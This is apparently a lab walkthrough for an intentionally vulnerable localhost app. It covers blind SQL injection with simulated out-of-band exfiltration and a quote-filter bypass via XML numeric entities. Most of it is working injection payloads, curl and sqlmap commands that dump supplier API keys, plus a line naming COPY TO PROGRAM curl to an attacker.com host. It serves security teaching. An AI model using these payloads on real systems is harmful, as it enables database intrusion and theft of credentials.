VULN-17 Blind SQLi – OOB Data Exfiltration (Simulated)

Endpoint: GET /products?sku=<value>

Context: The sku parameter is injected into a WHERE clause. Errors are suppressed, making this a true blind scenario. The oob_exfil() function runs as a side effect and writes data to oob_log (visible at /oob-log), simulating an OOB channel (DNS/HTTP).

# Exfiltrate supplier API key
/products?sku=SKU-001' OR 1=(SELECT oob_exfil((SELECT api_key FROM suppliers LIMIT 1),'sku-oob')::integer)--

# Exfiltrate DB name
/products?sku=SKU-001'; SELECT oob_exfil(current_database(),'v17')--

# Exfiltrate all supplier keys concatenated
/products?sku=SKU-001' OR 1=(SELECT oob_exfil(string_agg(api_key,':'),'v17')::integer FROM suppliers)--

# Then check receive server:
curl http://localhost:8085/oob-log

# sqlmap OOB mode
sqlmap -u "http://localhost:8085/products?sku=SKU-001" --technique=U --dbms=postgresql --dump -p sku

Real OOB: dblink to attacker's PostgreSQL, COPY TO PROGRAM 'curl attacker.com?d=...', or pg_read_file to exfil via timing. Simulated here with oob_log table.

VULN-18 SQLi – Filter Bypass via XML Encoding

Endpoint: POST /stock — Content-Type: application/xml

Context: The server filters raw XML body for literal ' (single quote). However, xml.Unmarshal decodes XML numeric entities before the application sees the value. Encoding ' as &#x27; passes the filter but is decoded to ' before SQL concatenation.

Step 1 – Normal request (blocked if contains '):

curl -X POST http://localhost:8085/stock \
  -H 'Content-Type: application/xml' \
  -d "<stockCheck><sku>SKU-001' OR '1'='1</sku></stockCheck>"
# → 400: invalid characters in request

Step 2 – Bypass with XML entity encoding:

# ' decodes to ' after xml.Unmarshal → filter bypassed
curl -X POST http://localhost:8085/stock \
  -H 'Content-Type: application/xml' \
  -d "<stockCheck><sku>SKU-001&#x27; OR &#x27;1&#x27;=&#x27;1</sku></stockCheck>"
# → {"found":true,"items":[...all rows...]}

# UNION to dump suppliers (4 cols: sku,name,quantity,location — add price)
curl -X POST http://localhost:8085/stock \
  -H 'Content-Type: application/xml' \
  -d "<stockCheck><sku>&#x27; UNION SELECT api_key,name,contact,&#x27;x&#x27;,&#x27;0&#x27; FROM suppliers--</sku></stockCheck>"

# Combined OOB + filter bypass:
curl -X POST http://localhost:8085/stock \
  -H 'Content-Type: application/xml' \
  -d "<stockCheck><sku>SKU-001&#x27; OR 1=(SELECT oob_exfil((SELECT api_key FROM suppliers LIMIT 1),&#x27;xml-oob&#x27;)::integer)--</sku></stockCheck>"

Why it works: The WAF-like filter sees &#x27; in raw bytes — no single quote — so it passes. Go's encoding/xml then decodes the entity to ' during Unmarshal, which is later concatenated into the SQL query verbatim.

Tables: inventory(sku,name,quantity,location,price), suppliers(name,contact,api_key), orders, oob_log

Sensitive target: suppliers.api_key
